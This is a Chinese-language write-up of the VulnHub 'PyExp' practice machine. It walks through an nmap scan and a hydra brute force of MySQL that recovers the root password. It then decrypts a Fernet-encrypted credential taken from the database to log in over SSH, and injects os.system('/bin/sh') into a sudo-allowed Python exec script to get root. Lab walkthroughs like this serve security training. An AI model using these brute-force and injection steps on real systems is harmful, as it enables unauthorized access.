# PyExp

> https://download.vulnhub.com/pyexp/pyexpvm.zip

靶场IP地址：`192.168.2.137`

扫描对外端口服务

```
┌──(root💀kali)-[/tmp]
└─# nmap -p1-65535 -sV 192.168.2.137                                                                                                                                                                                                     1 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2022-09-06 11:35 EDT
Nmap scan report for 192.168.2.137
Host is up (0.00055s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
1337/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
3306/tcp open  mysql   MySQL 5.5.5-10.3.23-MariaDB-0+deb10u1
MAC Address: 00:0C:29:42:B2:78 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.23 seconds

```

爆破MySQL服务

```
                                                                                                                                                                                                                                             
┌──(root💀kali)-[/tmp]
└─# hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.2.137 -t 64                                                                                                                                                      255 ⨯
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-06 11:38:57
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking mysql://192.168.2.137:3306/
[STATUS] 2041.00 tries/min, 2041 tries in 00:01h, 14342358 to do in 117:08h, 4 active
[3306][mysql] host: 192.168.2.137   login: root   password: prettywoman
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-06 11:41:54

```

登录MySQL查询信息

```shell
┌──(root💀kali)-[/tmp]
└─# mysql -u root -p -h  192.168.2.137                                                                                                                                                                                                 
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 20017
Server version: 10.3.23-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| data               |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.001 sec)

MariaDB [(none)]> use data;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [data]> show tables;
+----------------+
| Tables_in_data |
+----------------+
| fernet         |
+----------------+
1 row in set (0.001 sec)

MariaDB [data]> select * from fernet;
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
| cred                                                                                                                     | keyy                                         |
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
| gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys= | UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0= |
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
1 row in set (0.001 sec)

```

根据表名和内容可以知道，是要用fernet解密内容

```python
from cryptography.fernet import Fernet

key = "UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0="
cred = "gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys="

f = Fernet(key)

# convert from string to bytes
cred_byte = str.encode(cred)

# decrypt
decrypted = f.decrypt(cred_byte)

# convert back to string from bytes
decrypted_final = decrypted.decode()

# print the final answer
print(decrypted_final)
```

```
┌──(root💀kali)-[/tmp]
└─# python3 exp.py         
lucy:wJ9`"Lemdv9[FEw-
```

ssh登录lucy账号，查看sudo列表

```
┌──(root💀kali)-[/tmp]
└─# ssh -p 1337 lucy@192.168.2.137
lucy@192.168.2.137's password: 
Linux pyexp 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Aug 10 18:44:44 2020 from 192.168.1.18
lucy@pyexp:~$ id
uid=1000(lucy) gid=1000(lucy) groups=1000(lucy),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
lucy@pyexp:~$ sudo -l
Matching Defaults entries for lucy on pyexp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lucy may run the following commands on pyexp:
    (root) NOPASSWD: /usr/bin/python2 /opt/exp.py

```

查看`exp.py`

```
lucy@pyexp:~$ cat /opt/exp.py 
uinput = raw_input('how are you?')
exec(uinput)

lucy@pyexp:~$ ls -al /opt/exp.py 
-rw-r--r-- 1 root root 49 Aug 10  2020 /opt/exp.py

```

提权

```
lucy@pyexp:~$ sudo -u root /usr/bin/python2 /opt/exp.py
how are you?import os; os.system("/bin/sh")
# id
uid=0(root) gid=0(root) groups=0(root)
```

